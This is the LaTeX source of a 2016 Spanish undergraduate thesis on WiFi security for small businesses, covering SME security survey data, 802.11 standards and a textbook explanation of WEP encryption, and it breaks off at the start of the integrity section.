\RequirePackage{fix-cm}
\documentclass[a4paper,openright,10pt]{report}
\usepackage[spanish]{babel} 
\usepackage[latin1]{inputenc}
\usepackage{graphicx} % graficos
\usepackage{multirow} % para las tablas
\usepackage[spanish]{babel}%tablas en español
\usepackage{lettrine}%letras capitales
\usepackage{float}%comando [H]
\usepackage{verbatim}%introducir .txt
\usepackage{setspace}
\usepackage[draft]{fixme}
\usepackage{fancyhdr}
\usepackage{fancyvrb}
\usepackage{hyperref}%hipervinculos
\usepackage{pdfpages}%agregar pdf
\usepackage{color}
\usepackage{xcolor}
\usepackage{listings}
\usepackage{caption}
\usepackage{times}

\DeclareCaptionFont{white}{\color{white}}
\DeclareCaptionFormat{listing}{\colorbox{gray}{\parbox{\textwidth}{#1#2#3}}}
\captionsetup[lstlisting]{format=listing,labelfont=white,textfont=white}
\renewcommand{\lstlistingname}{Listado}

%% \lstset{
%%   language = bash,breaklines=true, 
%%   literate = {\$\#}{{{\$\#}}}2,
%%   columns  = fullflexible,
%%  % basicstyle = =\thefontsize\scriptsize,
%%   showstringspaces=false,
%%   commentstyle=\color{red},
%%   keywordstyle=\color{blue}
%% %  keepspaces,
%% }

\definecolor{gris30}{gray}{0.30}
\definecolor{gris85}{gray}{0.85}
\definecolor{gris20}{gray}{0.20}
\definecolor{gris50}{gray}{0.50}

\lstset{
  language=Bash,
  tabsize=4,
  showspaces=false,
  showtabs=false,
  showstringspaces=false,
  frame=b,
  framerule=1pt,
  aboveskip=0.5cm,
  framextopmargin=3pt,
  framexbottommargin=3pt,
  framexleftmargin=18pt,
  framesep=.4pt,
  rulesep=.4pt,
  rulesepcolor=\color{gris20},
  stringstyle=\ttfamily,
  basicstyle=\footnotesize\ttfamily\singlespacing,
  commentstyle=\color{gris30},
  keywordstyle=\bfseries,
  numbers=left,
  numbersep=6pt,
  numberstyle=\color[cmyk]{0.43,0.35,0.35,0.01}\bfseries\footnotesize\ttfamily,
  numberfirstline=true,
  breaklines=true,
  stepnumber=1,
  backgroundcolor=\color{white},
  xleftmargin=18pt,
  framexrightmargin=0pt,
  xrightmargin=0pt,
  texcl=true,
}

\lstloadlanguages{Bash,Python,TeX}

\def\thetitle{Seguridad y vulnerabilidad de redes inalámbricas en PYMEs}

\fancypagestyle{basicstyle}{%
  \fancyhf{}
  \fancyhead[R]{\nouppercase { \rightmark }}
  \fancyhead[L]{\leftmark}
  \fancyfoot[C]{\thepage}
  \renewcommand{\headrulewidth}{0.4pt}
  \renewcommand{\footrulewidth}{0pt}}

\pagestyle{basicstyle}

\begin{document}
%PORTADA%
\thispagestyle{empty}       %Pagina sin encabezado ni pie

\begin{center}
    \includegraphics[scale=0.85]{escudo.png}     %Escudo de la Universidad
\end{center}

\begin{center}
 \LARGE{\bf{UNIVERSIDAD DE CASTILLA-LA MANCHA}}
\end{center}

\begin{center}
 \LARGE{ESCUELA DE INGENIERÍA INDUSTRIAL DE}
\end{center}

\begin{center}
 \LARGE{TOLEDO}
\end{center}

\vspace{4mm}

\begin{center}
 \LARGE{TRABAJO FIN DE GRADO Nº 16-B-225031}
\end{center}

\vspace{4mm}

\begin{center}

 \title{\thetitle}
 {\LARGE\itshape\thetitle}
 
\end{center}

\vspace{10mm}

\begin{tabular}{cccl}
 \multirow{11}{*}{\includegraphics[scale=0.75]{escudo2.png}}
 &  & & Autor:\\
 &  &  & \\
 &  &  & LUIS RAMÍREZ DE DIEGO \\
 &  &  & \\
 &  &  & Director: \\
 &  &  & \\
 &  &  & FRANCISCO MOYA FERNÁNDEZ \\
 &  &  & \\
 &  &  & \\
 &  &  & \\
 &  &  & JULIO DE 2016
\end{tabular}

\newpage
$\ $
\thispagestyle{empty}
%----------------------------------------------------------------------------------------
%	TITULO Y COPYRIGHT PAGE 
%----------------------------------------------------------------------------------------
\begin{titlepage}
  \begin{center}
    \Huge\linespread{2}\textsc{\thetitle}
  \end{center}
%\newpage
\thispagestyle{empty}
\end{titlepage}

~\vfill

\noindent Copyright \copyright\ \\ % Copyright notice
\doublespace\noindent\textsc{\thetitle}

\noindent \textit{https://github.com/zooiberg/tfg/tree/master/memoria}\\ % URL

\noindent Memoria realizada durante el Trabajo Final de Carrera del alumno Luis Ramírez de Diego en el año lectivo 2015/2016 y supervisado por el profesor y tutor del proyecto, Francisco Moya Fernandez\\ % License information

\noindent \textit{Primera actualización, Junio 2016} % Printing/edition date
%pagina en blanco%
%\newpage
%$\ $
\thispagestyle{empty} % para que no se numere esta pagina
\pagenumbering{Roman}  % para comenzar la numeración de paginas en números romanos

% INDICE DE CONTENIDOS.FIGURAS Y TABLAS.
\tableofcontents % indice de contenidos
%\cleardoublepage
%\thispagestyle{empty} % para que no se numere esta pagina
\addcontentsline{toc}{chapter}{Lista de figuras} % para que aparezca en el indice de contenidos
\listoffigures % indice de figuras
%\thispagestyle{empty} % para que no se numere esta pagina
%\cleardoublepage
\addcontentsline{toc}{chapter}{Lista de tablas} % para que aparezca en el indice de contenidos
\listoftables % indice de tablas
\cleardoublepage


%%%%%%%%%%%%%%%%%%%%%%RESUMEN%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\phantomsection
\addcontentsline{toc}{chapter}{Resumen}

\begin{abstract}
  
\lettrine[lines=2]{E}{ste} proyecto consiste en la implementación de un dispositivo para generar posibles ataques básicos y conocidos a una red WiFi determinada, con el fin de generar un informe de manera automatizada con algunas de las posibles vulnerabilidades.


Se centrará en las vulnerabilidades de las redes inalámbricas, las cuales están en continuo crecimiento, y disponen de algunas ventajas frente a las cableadas. No solo por la comodidad en la instalación sino por la movilidad que brinda. No todo son ventajas, ya que en las comunicaciones inalámbricas la información se ``propaga'' por el aire, siendo posible capturar o escuchar dicha información. Ninguna red inalámbrica es completamente segura ya que todos los mecanismos o protocolos tienen vulnerabilidades, pero se puede trabajar para conseguir niveles aceptables de seguridad.

El proyecto fue pensado para fomentar y facilitar la venta de auditorías de seguridad. Por tanto, el dispositivo debe poder ejecutarse por un comercial sin conocimientos previos de informática. Su funcionamiento se basa en iniciar los ataques a la red inalámbrica, detectando así algunos de los puntos débiles de seguridad de la misma.

Con la ejecución de la aplicación y la posterior generación del informe por parte del comercial, la empresa tendrá conocimiento de algunas de las vulnerabilidades de su red inalámbrica. De esta manera, se intentará concienciar a las empresas de la facilidad  de intrusión en sus redes, encontrando así información confidencial y la posibilidad de ralentizar e incluso llegar a parar la producción de la mayoría de las empresas si no se toman unas medidas de seguridad informática adecuadas.

De cualquier modo, el objeto del proyecto es el paso previo a la posterior venta de una auditoría de seguridad completa (que se llevaría a cabo por un experto), por lo que la aplicación, simplemente servirá como método de detección de vulnerabilidades, no como solución de los mismos. Este proceso nunca debería utilizarse como sustituto a una auditoría, tan sólo debe plantearse de modo informativo.

El desarrollo completo del proceso culminaría con una auditoría técnica de seguridad, es decir un examen cuyo objetivo es evaluar la eficacia y eficiencia de los recursos informáticos y destacar posibles errores o fallos del sistema, pudiendo abarcar un gran número de posibilidades (internas, externas, web\ldots). Del mismo modo que en la fase previa, se centrará en las auditorías tipo \emph{wireless}, que se podrán tratar como auditorías internas o externas, dependiendo el nivel de información previa.

Dentro de la multitud de vulnerabilidades de la seguridad informática, el proyecto se centra en las redes WiFi. Estas redes son cada vez más utilizadas por gran parte de la sociedad en su día a día; por esto, y por su fácil instalación y conectividad, crecen en número diariamente. A pesar de los numerosos ejemplos de intrusión de estas redes, la sociedad aún no está lo suficientemente concienciada del fácil acceso a nuestra información y de la necesidad de la protección de los datos en la red. Nos encontramos en un momento en el que la información privada de las personas cada vez tiende a ser más pública. 

Desde hace años se ha intentando concienciar a la población de este serio problema que nos afecta a todos, desde particulares y la información almacenada en sus dispositivos hasta empresarios y la protección de sus bases de datos. Se pretende, con la materialización de los posibles fallos de la red a través del informe, alertar y poner de manifiesto la necesidad de la toma de medidas adecuadas para la protección, como la contratación de personal especializado y la realización de auditorías de forma periódica.

\end{abstract}



%%%%%%%%%%%%%%%%%%CAPITULO 1: INTRODUCCION%%%%%%%%%%%%%%%
\chapter{Introducción}\label{cap.introduccion}
\lettrine[lines=2]{D}{esde} el inicio del nuevo siglo, el uso de las tecnologías forma parte de nuestra actividad cotidiana, lo que implica que cada vez se tiende más, y con mayor frecuencia, a compartir en red todo tipo de datos.
Durante todos estos años de evolución tecnológica han aparecido cada vez más métodos de intrusión, pérdida o robo de datos e información personal (spam, virus, troyanos, intrusiones en red, etc).

Por otro lado, cada vez resulta más común la implantación de redes inalámbricas tanto por la comodidad de instalación, y reducción de costes, como la ausencia de cableado. Pero lo que se presenta como ventaja, también conforma su principal inconveniente, ya que al viajar a través del espacio, y no por un medio físico, permite que prácticamente cualquier persona con mínimos conocimientos informáticos pueda captar la información transmitida.

\pagenumbering{arabic}
\section{Motivación}

En la actualidad, no se ha conseguido una solución que erradique por completo las intrusiones de las redes, tanto por la falta de concienciación de la sociedad de este problema, como por la dificultad de controlar todas las vulnerabilidades y medidas de control de una red. Por ello, con este documento, se pretende por una parte intentar mejorar la conciencia social sobre la seguridad informática, y presentar y detectar algunas de las vulnerabilidades que podemos encontrar en las redes inalámbricas.

%%%%%%%%%%%%%%%% OBJETIVOS%%%%%%%%%%%%%%
\section{Objetivos}\label{cap.Objetivos}

%\lettrine[lines=2]{E}{n}
En cuanto a los objetivos del proyecto se destacará un objetivo principal, para entender el desarrollo de la aplicación al que se subordinaran una serie de objetivos secundarios.

\subsection{Objetivo general}

El objetivo principal es el desarrollo de un sistema de pre-auditoría de redes WiFi de caja negra que genere un informe de forma automática, de manera que sirva como argumento de venta de auditorías de seguridad.

%es decir, sin conocimientos previos de la infraestructura. Esto permite simular ataques realizados por parte de personal externo a la organización.
%la automatización de un dispositivo para realizar una serie de  ataques conocidos, a redes inalámbricas y así analizar algunas de las posibles vulnerabilidades de dichas redes, generando un informe con las posibles amenazas.

\subsection{Objetivos secundarios}
En un segundo lugar, pero no por ello menos importante, dispongo de una serie de objetivos que se encuentran subordinados al cumplimiento del objetivo principal.
\begin{enumerate}
	\item Crear una aplicación de detección de las vulnerabilidades de la red WiFi, que funcione mediante un dispositivo de fácil uso y de bajo coste. 	
	\item Dotar a dicha aplicación de una interfaz simple e intuitiva que facilite el desarrollo de una manera rápida, y pueda ser ejecutada por un comercial sin conocimientos informáticos previos. 
	\item Hacer que el dispositivo responsable de la ejecución de la aplicación sea portátil y de fácil movilidad.
	\item Recoger de forma sistemática todos los datos del análisis realizado por el dispositivo, que se plasmará en un informe de manera automatizada. 
	\item Generar un informe con posibles vulnerabilidades, según el estándar NIST SP 800-115\cite{SP}. Con un lenguaje sencillo y no demasiado técnico que permita una fácil comprensión.
	
\end{enumerate}

%%%%%%%ESTRUCTURA DE LA MEMORIA%%%%%%%%
\section{Estructura de la memoria}
\begin{itemize}

	\item Capítulo 1. En este capítulo se desarrollará una pequeña introducción acerca  del tema que se tratará a lo largo de la memoria, así como una serie de objetivos que se tienen que cumplir al finalizar la aplicación.
	\item Capítulo 2. Antecedentes. En él, se detallará un estudio previo de lo ya conocido y analizado sobre este tema, tanto su relación con las pymes, las generalidades de las redes WiFi y temas más específicos como las auditorias y la automatización, tanto de dispositivos como para la creación de informes.
	\item Capítulo 3. Proyecto: Se analiza específicamente cada proceso y fase del proyecto. Se secciona en función de los objetivos y su cumplimiento. Además, se detalla tanto los componentes y procesos de software como de hardware que intervienen en cada fase.
	\item Capítulo 4. Bibliografía. Conjunto de reseñas bibliográficas estudiadas, analizadas o citadas para la elaboración del proyecto y la memoria.
	
\end{itemize}




%%%%%%%%%%%%%%%% CAPITULO 2 ANTECEDENTES%%%%%%%%%%%
\chapter{Antecedentes}\label{cap.antecedentes}
%%%%ANTECEDENTES PYMES%%%%
\section[Seguridad informática de las PYMEs]{Seguridad informática en pequeñas y medianas empresas (PYMEs)}

\lettrine[lines=2]{D}{esde} que la tecnología forma parte de nuestra vida cotidiana, se encuentra cada vez más presente en las empresas, la pérdida o robo de información de datos electrónicos. Esto conlleva un importante agujero de seguridad, debido a una falta de previsión en la implantación de los métodos de seguridad.

Para cualquier empresa plantear un buen uso de las TIC (Tecnologías de la Información y la Comunicación) es un punto clave que se debe tener en cuenta y aprovechar al máximo para aumentar la productividad y la eficiencia. Existe una gran inversión en cuanto a equipamiento informático y servicios básicos de comunicación que emplean las empresas, para su posible interconexión.

En la actualidad las tecnologías inalámbricas y móviles tienen cada vez más peso en las empresas. Según un informe de 2012 realizado conjuntamente por Fundetec y el ONTSI\cite{ipyme} sobre el análisis de implantación de las TIC en las pymes españolas, el 99,9\% de ellas disponen de ordenadores.   
\begin{figure}[H]
  \centering
   \includegraphics[width=1\textwidth]{equipamiento.png}
  \caption{Equipamiento informático presente en las empresas.}
  \label{figura:eq}
\end{figure}

En esta Figura \ref{figura:eq} apreciamos el gran uso por parte de las empresas de las nuevas tecnologías, tanto en ordenadores como en dispositivos móviles. Estos últimos están teniendo un crecimiento exponencial; su difusión conlleva la necesidad de asegurar su protección. 

A medida que aumenta la implantación de dispositivos informáticos individuales en las empresas como método de trabajo, es necesaria la conexión entre ellos para compartir los datos y poder llevar a cabo un trabajo colectivo. La interconexión de estos dispositivos se lleva a cabo mediante la creación de una red interna, pudiendo ser inalámbrica o cableada. Asegurar la red es de igual importancia que la protección de los dispositivos.

\begin{figure}[H]
  \centering
   \includegraphics[width=1\textwidth]{servicios.png}
  \caption{Servicios de red inalámbrica o wifi declarados por las empresas (\%)}
  \label{figura:servicios}
\end{figure}

Como indica el gráfico anterior, a pesar de la disponibilidad de varios tipos de redes, un gran número de las empresas optan por las redes inalámbricas. Y además, un 13\% de ellas no restringe el acceso.

\subsection{Herramientas de seguridad}

En 2012 INTECO realizó una encuesta a mas de 1000 empresas españolas para posteriormente elaborar un informe~\cite{INTECO}.  Podemos destacar un notable grado de implicación en cuanto a las medidas básicas aplicables. Un gran número de las empresas encuestadas utilizan medidas paquetizadas, conocidas por todos (antivirus, antiespias, cortafuegos). No obstante, no deberían conformarse con estas soluciones tan elementales, ya que un gasto inicial en seguridad puede paliar futuros gastos de pérdida de información. Sin personalizar en una empresa, ni en su posible capital, cualquier robo de información por un fallo en la seguridad, obligará a invertir tiempo y dinero en la investigación de las posibles causas y la magnitud de los daños causados, tanto a nivel económico como en la reputación de la empresa.

\begin{figure}[H]
  \centering
   \includegraphics[width=1\textwidth]{inteco1.png}
  \caption{Nivel de implantación declarado de soluciones de seguridad en la empresa.}
  \label{fig:ej}
\end{figure}

Como ha sido comentado anteriormente, igual de importante que la protección de los dispositivos, es la seguridad de las redes que lo conectan. También podemos extraer del informe de INTECO, que frente al dato de casi el 100\% de los dispositivos se encuentran protegidos por algún posible método, por muy básico que sea, todavía un 13\% de las redes no cuentan con ningún tipo de protección.

La seguridad informática debe ser entendida como un proceso, no como una propiedad del sistema.  Por tanto es tan importante la revisión periódica por personal especializado como el diseño inicial.  La implantación de un cifrado o sistema de seguridad en un inicio, no garantiza una seguridad permanente. En la actualidad podemos elegir entre distintos protocolos de seguridad para las redes WiFi (WEP, WPA, WPA/WPA2), de los que se deben elegir WPA/WPA2 por los niveles de robustez en su cifrado.  Sin embargo el informe de INTECO destaca que un 27,4\% de los encuestados emplea WEP, debido a la falta de información de la diferencia de niveles de seguridad que aportan cada uno de ellos. 

Debido a los avances tecnológicos e informáticos, tanto los ataques como las protecciones evolucionan a diario, por ello es igual de importante que la buena elección de un protocolo de seguridad, llevar a cabo un control periódico, que podría tratarse de auditorías informáticas.
\begin{figure}[H]
  \centering
   \includegraphics[width=1\textwidth]{medidas.png}
  \caption{Medidas de seguridad de las redes WiFi}
  \label{fig:medidas}
\end{figure}

\subsection{Limitaciones de seguridad.}

El nivel de importancia de la seguridad de las empresas también esta reflejado en este estudio. En él, se resumen las principales razones aportadas por las pymes para justificar la falta de herramientas de seguridad que se emplean en su día a día.
La gran mayoría de las empresas que acusan no tener alguna de las soluciones, lo justifican exponiendo no disponer de la necesidad o del desconocimiento de ellas. También exponen una falta de presupuesto o la impresión de ineficiencia, aunque en menor medida.
Aún así, en las pymes se muestra inconsciencia, desinterés y falta de capital a la hora de aplicar medidas que no sean las tradicionales. Es por ello que se debe trabajar en ampliar estas medidas, sensibilizando los organismos que trabajan con las empresas.

\begin{figure}[H]
  \centering
   \includegraphics[width=1\textwidth]{inteco2.png}
  \caption{Motivos señalados por las empresas para no utilizar las herramientas y soluciones de seguridad.}
  \label{fig:limitaciones}
\end{figure}
En la Figura \ref{fig:limitaciones} se enumeran una serie de posibles soluciones básicas y los posibles motivos por los que las empresas no se decantan por alguno de ellos.

\subsection{Personal encargado de la seguridad de la información.}
No se debería delegar toda la responsabilidad de los datos o de la información en una sola persona, ni si quiera en un grupo de empleados. Todos los individuos deberían estar concienciados y formados para una mejora en este ámbito. No obstante siempre es importante contar con profesionales, que sepan manejar las herramientas de seguridad, y sepan actuar ante un posible ataque.

\begin{figure}[H]
  \centering
   \includegraphics[width=1\textwidth]{inteco3.png}
  \caption{Disponibilidad de personal dedicado a la seguridad de la información.}
  \label{fig:eje}
\end{figure}

Gracias al estudio citado con anterioridad, sabemos que las empresas no suelen tener contratado profesionales internos que se dediquen exclusivamente a la seguridad. Normalmente externalizan estas funciones o en menor medida compatibilizan las tareas de seguridad con tareas relacionadas con la informática. Entre todas ellas apreciamos un 43,1\% las cuales ni siquiera consideran importante la contratación de algún tipo de profesional que se encargue de temas relacionados con la seguridad de la información. 

\begin{figure}[H]
  \centering
   \includegraphics[width=1\textwidth]{personal.png}
  \caption{Disponibilidad de personal dedicado a la seguridad según tamaño de empresa (\%).}
  \label{fig:personal}
\end{figure}

Como podemos extraer de los resultados anteriores, los recursos dedicados a personal específico de seguridad de la información tienen mucha relación con el tamaño de la empresa, ya que empresas de mayor tamaño se encuentran más preocupadas y cuentan con personal específico, mientras que las medianas y pequeñas empresas no lo consideran tan importante, y por ello compatibilizan o externalizan esta función. Contando también con un alto porcentaje (44\% en la microempresa y reduciéndose según aumenta el tamaño de la misma, hasta el 7\% en la mediana empresa) de empresas en las que no esta considerado ni siquiera el personal de seguridad. Como apoyo a este dato, las empresas responsables de seguridad, indican que tienen como principal prioridad la implementación de sistemas informáticos, y de forma secundaria la protección de los mismos mediante un sistema de seguridad de la información.


Una razón de peso para las empresas, en la que apoyan la externalización del personal dedicado a la seguridad informática es la consideración de que una persona externa a la empresa garantiza un conocimiento más profundo y actualizado.
De todos estos datos, extraemos que este proyecto se encontrará más enfocado y contará con mayor demanda en las pequeñas y medianas empresas, ya que se encuentran menos concienciadas de la falta de seguridad y recurren con mayor frecuencia a personal externo. 
%%%%%%%ANTECEDENTES WIFI%%%%
\section{Seguridad informática en redes WiFi}

Hace años cuando se empezaron a utilizar las redes inalámbricas existía un error de incompatibilidad, debido a que cada fabricante usaba un estándar distinto, fue en ese momento cuando las empresas punteras se reunieron para crear WECA (Wireless Ethernet Compability Aliance) que en la actualidad lo llamamos como WIFI Alliance.\footnote{Página oficial de Wi-Fi Alliance. (2016) \url{http://www.wi-fi.org/}}
\begin{figure}[H]
  \centering
    \includegraphics{wifi}
  \caption{Imagen wifi}
  \label{fig:wifi}
\end{figure}

En el año 2000 se implanta la interoperabilidad que permite operar entre todos los dispositivos Wi-Fi bajo la especificación IEE 802.11b. Es por ello que sabemos que todos equipos que dispongan del sello de Wi-Fi pueden interactuar independientemente del fabricante.
Gracias a Wi-Fi se pueden crear redes de área local inalámbricas y conectar multitud de equipos mientras no estén muy alejados del punto de acceso a una velocidad elevada.

\subsection{Estándares WI-FI}
El estándar original se ha ido modificando con el objetivo de ir mejorando la seguridad y la compatibilidad. Esta tabla nos enseña las distintas modificaciones del estándar 802.11 y a lo que se refiere~\cite{802.11}.
%%%TABLAAAAA%%%
\begin{table}[H]
\begin{center}
\begin{tabular}{| p{2.2cm} | p{4cm} | p{6.6 cm} | }
\hline
Nombre del estándar & Nombre& Descripción \\
\hline \hline
802.11a & Wifi5  & El estándar 802.11a (llamado WiFi 5) admite un ancho de banda superior (el rendimiento total máximo es de 54 Mbps aunque en la práctica es de 30 Mpbs). El estándar 802.11a provee ocho canales de radio en la banda de frecuencia de 5  \\ \hline
802.11b  & WiFi & El estándar 802.11b es el más utilizado actualmente. Ofrece un rendimiento total máximo de 11 Mpbs (6 Mpbs en la práctica) y tiene un alcance de hasta 300 metros en un espacio abierto. Utiliza el rango de frecuencia de 2,4 GHz con tres canales de radio disponibles. \\ \hline
802.11c &Combinación del 802.11 y el 802.1d  & El estándar combinado 802.11c no ofrece ningún interés para el público general. Es solamente una versión modificada del estándar 802.1d que permite combinar el 802.1d con dispositivos compatibles 802.11 (en el nivel de enlace de datos). \\ \hline
802.11d & Internacionalización & El estándar 802.11d es un complemento del estándar 802.11 que está pensado para permitir el uso internacional de las redes 802.11 locales. Permite que distintos dispositivos intercambien información en rangos de frecuencia según lo que se permite en el país de origen del dispositivo. \\ \hline
802.11e & Mejora de la calidad del servicio  & El estándar 802.11e está destinado a mejorar la calidad del servicio en el nivel de la capa de enlace de datos. El objetivo del estándar es definir los requisitos de diferentes paquetes en cuanto al ancho de banda y al retardo de transmisión para permitir mejores transmisiones de audio y vídeo. \\ \hline
802.11f & Itinerancia  & El 802.11f es una recomendación para proveedores de puntos de acceso que permite que los productos sean más compatibles. Utiliza el protocolo IAPP que le permite a un usuario itinerante cambiarse claramente de un punto de acceso a otro mientras está en movimiento sin importar qué marcas de puntos de acceso se usan en la infraestructura de la red. También se conoce a esta propiedad simplemente como itinerancia.  \\ \hline
\end{tabular}
\caption{Estándar 802.11.}
\label{tabla:802.11}
\end{center}
\end{table}

\begin{table}[htbp]
\begin{center}
\begin{tabular}{| p{2.2cm} | p{4cm} | p{6.6 cm} | }
%\hline
%Nombre del estándar & Nombre& Descripción \\
\hline \hline
802.11g & & El estándar 802.11g ofrece un ancho de banda elevado (con un rendimiento total máximo de 54 Mbps pero de 30 Mpbs en la práctica) en el rango de frecuencia de 2,4 GHz. El estándar 802.11g es compatible con el estándar anterior, el 802.11b, lo que significa que los dispositivos que admiten el estándar 802.11g también pueden funcionar con el 802.11b. \\ \hline
802.11h & & El estándar 802.11h tiene por objeto unir el estándar 802.11 con el estándar europeo (HiperLAN 2, de ahí la h de 802.11h) y cumplir con las regulaciones europeas relacionadas con el uso de las frecuencias y el rendimiento energético.\\ \hline
802.11i & &El estándar 802.11i está destinado a mejorar la seguridad en la transferencia de datos (al administrar y distribuir claves, y al implementar el cifrado y la autenticación). Este estándar se basa en el AES (estándar de cifrado avanzado) y puede cifrar transmisiones que se ejecutan en las tecnologías 802.11a, 802.11b y 802.11g.  \\ \hline
802.11Ir &  & El estándar 802.11r se elaboró para que pueda usar señales infrarrojas. Este estándar se ha vuelto tecnológicamente obsoleto. \\ 
\par
\hline
802.11j &  & El estándar 802.11j es para la regulación japonesa lo que el 802.11h es para la regulación europea. \\ \hline
802.11k & & El 802.11k ayuda a gestionar las redes. El estándar IEEE 802.11k permite a los conmutadores y puntos de acceso inalámbricos calcular y valorar los recursos de radiofrecuencia de los clientes de una red WLAN, mejorando así su gestión. \\ \hline
802.11m & & El estándar 802.11m ha sido propuesto para el mantenimiento de las redes inalámbricas. \\ \hline
802.11n &  & El estándar 802.11n trabaja tanto en la banda de 2.4GHz como en la de 5GHz, que es mucho más estable y segura, pero de momento mucho más cara de implementar. Además aumenta la velocidad máxima de transmisión de 54 Mbps a un máximo de 600 Mbps. \\ 
\par
\hline
\end{tabular}
\caption{Estándar 802.11.}
\end{center}
\end{table}

%\section{TCP-IP}
%Es un protocolo para comunicaciones por red de datos para sistemas UNIX. A veces se pueden referir a el como conjunto de protocolos TCP/IP (\textit{Transmission Control Protocol/ Internet Protocol}). Es un protocolo DARPA que facilita transmision fiable y paquetes de datos sobre red. Este protocolo es la base del Internet con el que comunicamos varios dispositivos con diferente sistema operativos . Este protocolo fue desarrollado en Estados Unidos en 1972, ejecutandolo en ARPANET un departamento de defensa.
%\subsection{Modelo OSI}
%En la década de 1980 se obtuvo un gran crecimiento en la cantidad y el tamaño de las redes. Las empresas se dieron cuenta de las ventajas que estas redes ofrecían


%VPN. (\textit{Virtual Private Network}) se utiliza para conectar uno o varios dispositivos a una red privada utilizando internet. Normalmente lo utilizan las empresas para conectarse desde otros lugares que no son su puesto de trabajo a base de datos o recursos corporativos de su empresa.  Para que esta red asegure la confidencialidad y la integridad de la información que estamos consultando, debemos utilizar protocolos de cifrado.(IPsec, PPTP, L2TP). Con esto sabemos que los datos transmitidos por la red no podrán ser interceptados por un atacante, ya que son ilegibles hasta que lleguen a su destino.

\subsection{Comunicaciones Inalámbricas}

Las comunicaciones inalámbricas se han extendido de forma exponencial estos años, tanto en ambientes de empresa, como en los hogares y espacios públicos. Gracias al crecimiento desmesurado de los teléfonos inteligentes (smartphones), ordenadores portátiles y otros dispositivos se ha fomentado la propagación de este tecnología en diferentes frentes.
Sabemos que en la actualidad estas redes se comercializan como reclamo de usuarios, pudiendo utilizarse en cafeterías, parques y hoteles.

Estas redes tienen una dualidad enfrentada. Todos vemos los beneficios que tienen en cuanto a su flexibilidad, movilidad en los puestos de trabajo e incluso una reducción de costes, pero estos beneficios pueden convertirse en su principal problema, ya que puede haber fugas de información, contraseñas y otros datos personales.
Disponer de una red inalámbrica segura y de cierta calidad es sin duda una obligación para todo tipo de empresa y puede suponer un gran reto en las pymes, donde no suelen contar con un responsable tecnológico o tienen presupuestos reducidos.
Las redes inalámbricas pueden acoger distintas topologías.
\begin{itemize}
	\item Modo Ad-Hoc.
	Es una conexión que comunica una serie de dispositivos entre sí, sin usar ningún tipo de Punto de Acceso. Ésta, es una configuración tipo punto a punto (peer-to-peer).  Así, el área de cobertura se limita por el alcance de cada tarjeta de red propia. Deben trabajar en el mismo rango de frecuencias, de lo contrario no podrán interactuar entre ellas.
	\item Modo Infraestructura.
	Este modo es del tipo cliente-servidor, en el que los clientes son los dispositivos que se conectan al servidor, el punto de acceso. Tiene que haber como mínimo un servidor, por lo tanto los dispositivos no se pueden comunicar entre sí y toda la información pasará primero por el Punto de Acceso. Para que varios dispositivos puedan comunicarse entre sí, deben estar todos conectados al mismo punto de acceso, por lo que pueden estar comunicándose entre los dispositivos sin saber nada entre ellos, ya que toda la información que se necesita para la conexión, la tiene el punto de acceso.
\end{itemize}

\subsection{Protocolos inalámbricos}

El cifrado WLAN desde sus orígenes ha estado ligado a vulnerabilidades y ataques varios. En el año 2000 y con la aparición del protocolo 802.11 comenzó el cifrado WEP, aunque pocos años más tarde se percataron de la facilidad para vulnerarlo. En la actualidad, los ataques van más dirigidos a WPA o WPA2 ya que WEP debería estar completamente en desuso, aunque tristemente no es así.


\subsubsection{Protocolo WEP}
 WEP (Wired Equivalenet Privacy) fue el primer protocolo de cifrado que se implantó con el primer estándar IEEE 802.11. Es un protocolo que no ofrece mucha seguridad en una red inalámbrica, ya que esta seguridad está obsoleta y se conocen muchas maneras de descifrar el contenido de las tramas que van cifradas con WEP. Para entender bien el proceso de cifrado WEP, diferenciaremos entre sus tres fases:

\paragraph{Autenticación}
\begin{itemize}	
	\item Open System:(Autenticación de sistema abierto)
	\item Shared Key:(Autenticación por clave compartida)
\end{itemize}
En cuanto a la autenticación, \textit{Open system} deja a todos los clientes que lo pidan, autenticarse al punto de acceso, mientras que \textit{Shared key} necesita un mensaje solicitando conexión previa. Éste (punto de acceso) contesta con un paquete cifrado por el cliente y se reenvía al punto de acceso que intenta descifrar la autenticación para que sea válida.

\paragraph{Confidencialidad}


La fase de confidencialidad se encarga de que nadie que estuviera \textit{escuchando} y \textit{capturando} la transmisión  pueda entender o analizar la información, para ello dispone de varios elementos a tener en cuenta:
	\begin{itemize}
	\item RC4, es el algoritmo de cifrado de la información, el cual emplea un sistema que consiste, en que el emisor y el receptor deben saber la clave con anterioridad, y por tanto generar el \textit{keystream} (dos fases: KSA y PRGA). Así, recibe un flujo de bits que debe cifrar, y por otro sitio un flujo de bits codificados. Juntando estos dos flujos y por medio de una operación binaria XOR entre ellos, nos dará un único flujo ya cifrado. El problema es que estos bits codificados son generados por medio de operaciones matemáticas complejas sobre una secuencia de bits que se le llama la "semilla", que es de un único tamaño. Por ello al utilizar siempre la misma "semilla", se demuestra matemáticamente que una persona mal intencionada capturando un numero suficientes de tramas, puede adivinarla.
	WEP permite utilizar claves de distintos tamaños:  64 bits (40 de la clave del usuario más 24 de los vectores de iniciación) o de 128(104 de la clave del usuario más 24 de los vectores de iniciación)
		\item IV, son los vectores de inicialización, son la parte dinámica de los \textit{keystream.} Cada trama lleva un IV distinto, aunque al ser generados de forma aleatoria no siempre es posible. Los IV van en la parte que no se cifra de la trama WEP.
	\end{itemize}
\begin{figure}[H]
  \centering
    \includegraphics[width=1\textwidth]{WEP1.png}
  \caption{Algoritmo de Encriptación WEP}
  \label{fig:wep}
\end{figure}
En esta imagen \footnote{Algoritmo de Encriptación WEP. Recuperado de \url{http://cursoslibres.academica.mx/206/seguridad-en-redes/3-protecciones-y-herramientas-de-seguridad/protocolos-de-seguridad.}} se puede apreciar el proceso que se lleva acabo para formar la trama WEP, ya sea del punto de acceso al cliente, o del cliente al punto de acceso. La \textit{shared key} es estática, es la que configura el dueño de la red en el punto de acceso, o si fuera en la casa de un particular en el router WiFi (5 caracteres o 10 hexadecimales) o (13 caracteres o 26 hexadecimales). Los IV como se ha mencionado  van cambiando aleatoriamente en cada trama. Esta cadena junto con la clave estática es introducida en el algoritmo RC4 como entrada. La salida de éste produce el \textit{keystream.}

\paragraph{Integridad}

